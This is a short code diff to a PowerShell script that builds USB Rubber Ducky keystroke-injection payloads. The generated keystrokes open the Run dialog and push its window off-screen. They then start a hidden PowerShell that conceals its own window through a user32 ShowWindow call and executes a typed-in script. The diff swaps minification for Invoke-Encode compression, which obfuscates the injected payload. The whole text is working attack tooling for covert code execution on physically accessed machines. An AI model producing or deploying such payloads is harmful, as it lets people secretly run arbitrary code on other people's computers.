@@ -3,24 +3,25 @@
 # Pushes the actual PowerShell script in using char capture, allowing a
 # relatively arbitrary length payload.
 #
-param([string]$scriptFileName)
+param([Parameter(Mandatory=$true)][string]$scriptFileName)
 
 $script = Get-Content $scriptFileName -Raw
 $outputFile = "${scriptFileName}.ducky.txt"
 
-Import-Module "$PSScriptRoot\minification\minJS.psm1"
-$minifiedScript = minify -InputData $script -InputDataType ps1
+. "$PSScriptRoot\compression\Invoke-Encode.ps1"
+Invoke-Encode $script -IsString -PostScriptCommand | Out-Null
+$zippedScript = Get-Content .\encodedcommand.txt
 
 "DELAY 5000",
 "GUI r",
 "DELAY 250",
 "ALT SPACE",
 "STRING M",
-"LEFT",
+"DOWN",
 "REPEAT 40",
 "ENTER",
 'STRING powershell -w hidden iex ''(Add-Type n -pas -m ''''[DllImport(\"user32\")]public static extern int ShowWindow(int h,int n);'''')::ShowWindow((gps -Id $pid).MainWindowHandle,0);Read-Host|iex''',
 "ENTER",
 "DELAY 1000",
-"STRING $minifiedScript",
+"STRING $zippedScript",
 "ENTER" | Out-File -e "ASCII" "$outputFile"
